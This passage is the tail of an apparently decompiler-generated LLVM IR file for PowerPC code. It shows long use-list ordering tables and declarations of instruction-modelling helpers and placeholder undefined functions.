277, 1040, 1041, 278, 1042, 1062, 183, 1063, 279, 1054, 13, 1026, 1027, 127, 501, 502, 280, 281, 282, 503, 504, 74, 75, 505, 506, 507, 283, 508, 509, 510, 72, 73, 511, 512, 1028, 1029, 1030, 1031, 1032, 1033, 128, 1039, 536, 537, 538, 539, 540, 129, 541, 542, 543, 255, 544, 130, 131, 422, 132, 423, 424, 133, 425, 134, 513, 184, 93, 284, 514, 515, 14, 772, 426, 427, 135, 428, 429, 430, 778, 780, 44, 781, 76, 782, 779, 776, 777, 15, 441, 437, 438, 439, 440, 185, 16, 785, 783, 784, 186, 786, 787, 442, 443, 444, 445, 446, 285, 447, 448, 788, 789, 286, 790, 136, 791, 792, 793, 794, 795, 796, 797, 798, 256, 257, 287, 671, 672, 187, 673, 674, 675, 676, 682, 683, 684, 685, 137, 686, 687, 688, 550, 551, 552, 553, 554, 218, 555, 45, 556, 138, 139, 557, 558, 559, 560, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 288, 1051, 17, 140, 631, 141, 142, 901, 902, 31, 32, 229, 33, 903, 188, 904, 905, 189, 289, 906, 677, 678, 679, 680, 681, 689, 144, 143, 690, 907, 908, 190, 633, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1055, 1056, 1057, 77, 1058, 1059, 1060, 1061, 145, 909, 910, 911, 912, 913, 914, 691, 692, 693, 694, 695, 696, 146, 729, 730, 731, 732, 733, 734, 739, 735, 736, 737, 738, 191, 740, 741, 742, 18, 78, 743, 449, 697, 744, 488, 489, 915, 916, 94, 917, 918, 919, 920, 921, 219, 922, 923, 924, 147, 925, 926, 927, 928, 929, 148, 930, 931, 932, 933, 934, 935, 936, 149, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 46, 166, 167, 192, 948, 949, 150, 950, 290, 951, 952, 291, 955, 155, 151, 953, 954, 293, 956, 957, 958, 960, 156, 961, 19, 20, 157, 158, 152, 153, 962, 963, 154, 964, 965, 966, 967, 968, 969, 970, 971, 972, 292, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 398, 984, 34, 986, 79, 95, 159, 294, 988, 258, 989, 985, 987, 990, 991, 160, 431, 432, 86, 62, 84, 959, 193, 1034, 1036, 1035, 195, 161, 1038, 1037, 194, 230, 745, 746, 295, 747, 162, 748, 749, 750, 751, 752, 753, 754, 755, 756, 296, 757, 758, 759, 760, 761, 762, 231, 232, 163, 234, 490, 196, 491, 492, 26, 493, 494, 495, 233, 496, 297, 497, 498, 499, 220, 992, 993, 298, 763, 764, 765, 766, 768, 769, 770, 1014, 299, 545, 707, 998, 450, 999, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 799, 767, 1052, 1053, 301, 300, 462, 463, 80, 81, 22, 198, 21, 199, 197, 306, 464, 35, 465, 47, 168, 304, 305, 48, 169, 236, 235, 303, 200, 307, 308, 302, 466, 467, 468, 470, 211, 469, 471, 472, 311, 312, 309, 310, 473, 314, 315, 242, 237, 238, 239, 240, 241, 474, 313, 82, 316, 317, 475, 476, 477, 318, 478, 479, 480, 96, 49, 23, 97, 481, 98, 50, 206, 205, 204, 482, 483, 99, 51, 203, 202, 201, 243, 319, 244, 516, 517, 518, 519, 520, 521, 522, 320, 523, 321, 524, 322, 245, 323, 247, 525, 246, 526, 527, 528, 529, 530, 531, 532, 533, 324, 534, 164, 207, 535, 325, 248, 326, 250, 249, 546, 547, 548, 327, 549, 329, 52, 170, 171, 53, 24, 328, 561, 330, 698, 209, 331, 699, 700, 208, 332, 701, 702, 55, 54, 25, 703, 333, 704, 87, 88, 56, 705, 165, 335, 708, 36, 251, 252, 334, 83, 709, 710, 336, 337, 338, 57, 58, 771, 339, 214, 59, 800, 994, 995, 259, 996, 997, 1072, 1073, 1074, 399, 400, 401, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096 }
  uselistorder i32* @lr, { 5, 171, 172, 173, 174, 175, 176, 177, 359, 431, 432, 433, 178, 182, 179, 180, 181, 186, 187, 183, 184, 185, 188, 189, 190, 191, 192, 6, 7, 8, 9, 10, 11, 193, 196, 194, 1, 195, 0, 197, 199, 200, 198, 201, 202, 203, 204, 205, 206, 19, 360, 361, 302, 303, 304, 305, 362, 363, 364, 365, 344, 438, 439, 440, 441, 434, 435, 436, 437, 207, 208, 209, 215, 210, 211, 214, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 20, 21, 22, 366, 367, 368, 442, 369, 370, 306, 307, 308, 309, 310, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 443, 444, 91, 92, 93, 383, 384, 345, 346, 445, 446, 455, 456, 459, 460, 461, 462, 463, 476, 478, 480, 457, 458, 111, 112, 113, 114, 115, 116, 117, 447, 453, 454, 12, 13, 118, 15, 119, 14, 16, 347, 349, 348, 23, 24, 25, 26, 27, 28, 350, 351, 352, 353, 354, 355, 288, 66, 155, 289, 290, 249, 291, 292, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 263, 264, 265, 266, 267, 464, 465, 466, 467, 468, 471, 472, 473, 212, 213, 385, 386, 387, 388, 261, 262, 479, 477, 389, 390, 391, 268, 269, 270, 271, 311, 312, 313, 314, 315, 29, 272, 273, 316, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 17, 18, 406, 448, 449, 450, 451, 452, 474, 475, 317, 318, 319, 320, 321, 322, 323, 324, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 420, 421, 110, 325, 326, 327, 328, 424, 30, 31, 32, 33, 34, 469, 470, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 67, 73, 68, 69, 70, 71, 72, 2, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 293, 294, 295, 296, 297, 298, 299, 300, 301, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 356, 357, 358, 422, 423, 425, 426, 427, 428, 429, 430, 3, 4 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #0

declare i32 @__asm_mfcr() local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare i4 @__asm_mcrf_cr0_read(i1, i1, i1, i1) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

attributes #0 = { nounwind readnone }
